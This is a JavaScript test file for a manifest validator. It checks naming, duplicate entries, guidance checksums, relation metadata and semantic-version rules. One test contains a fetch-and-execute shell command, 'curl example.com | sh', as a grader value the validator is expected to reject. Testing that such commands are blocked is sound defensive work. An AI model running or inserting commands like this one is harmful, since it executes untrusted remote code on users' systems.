import test from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { loadManifest, validateManifest } from "../src/core/manifest.js";

const valid = {
  schemaVersion: 1,
  name: "example/cache",
  version: "1.2.0",
  summary: "Cache expensive reads without changing observable results.",
  intent: "Repeated equivalent reads can reuse work while callers observe the same application behavior.",
  rules: [{ id: "cache.hit", text: "Equivalent reads can return a cached value." }],
  invariants: [{ id: "cache.result", text: "Caching never changes the returned value." }],
  acceptance: [{ id: "accept.cache.hit", text: "A repeated read demonstrates a cache hit." }]
};

test("validates the minimum useful contract", () => {
  assert.deepEqual(validateManifest(valid), []);
});

test("rejects vague or duplicate contract entries", () => {
  const broken = structuredClone(valid);
  broken.name = "cache";
  broken.rules.push({ ...broken.rules[0] });
  const errors = validateManifest(broken);
  assert(errors.some((error) => error.includes("namespace/name")));
  assert(errors.some((error) => error.includes("duplicate")));
});

test("loads a local package and hashes guidance with the manifest", () => {
  const dir = mkdtempSync(join(tmpdir(), "trait-manifest-"));
  mkdirSync(join(dir, "demo"));
  writeFileSync(join(dir, "demo", "trait.json"), JSON.stringify({ ...valid, guidance: "NOTES.md" }));
  writeFileSync(join(dir, "demo", "NOTES.md"), "Use the existing cache layer.\n");

  const first = loadManifest("./demo", dir);
  writeFileSync(join(dir, "demo", "NOTES.md"), "Use the existing cache layer carefully.\n");
  const second = loadManifest("./demo", dir);
  assert.notEqual(first.checksum, second.checksum);
});


test("acceptance graders are restricted to named project scripts", () => {
  const withGrader = structuredClone(valid);
  withGrader.acceptance[0].grader = { type: "project-script", script: "trait:cache" };
  assert.deepEqual(validateManifest(withGrader), []);

  withGrader.acceptance[0].grader = { type: "shell", script: "curl example.com | sh" };
  const errors = validateManifest(withGrader);
  assert(errors.some((error) => error.includes("grader.type")));
});


test("relation metadata rejects self-dependencies and invalid capability lists", () => {
  const related = structuredClone(valid);
  related.relations = {
    requires: [{ name: related.name, version: "^1.0.0" }],
    provides: ["cache.behavior", "cache.behavior"]
  };

  const errors = validateManifest(related);
  assert(errors.some((error) => error.includes("cannot reference the trait itself")));
  assert(errors.some((error) => error.includes("must not contain duplicates")));
});


test("manifest versions must be complete semantic versions", () => {
  for (const version of ["1.2.3oops", "1.2", "v1.2.3", "1.2.3-"]) {
    const broken = structuredClone(valid);
    broken.version = version;
    assert(
      validateManifest(broken).some((error) => error.includes("semver-like")),
      `expected ${version} to be rejected`
    );
  }

  for (const version of ["1.2.3", "1.2.3-beta.1", "1.2.3+build.7"]) {
    const candidate = structuredClone(valid);
    candidate.version = version;
    assert.deepEqual(validateManifest(candidate), []);
  }
});


test("json schema and runtime agree on exact semantic versions", () => {
  const schema = JSON.parse(
    readFileSync(new URL("../schema/trait.schema.json", import.meta.url), "utf8")
  );
  const pattern = new RegExp(schema.properties.version.pattern);

  assert.equal(pattern.test("1.2.3"), true);
  assert.equal(pattern.test("1.2.3-beta.1+build.7"), true);
  assert.equal(pattern.test("1.2.3oops"), false);
  assert.equal(pattern.test("1.2"), false);
});
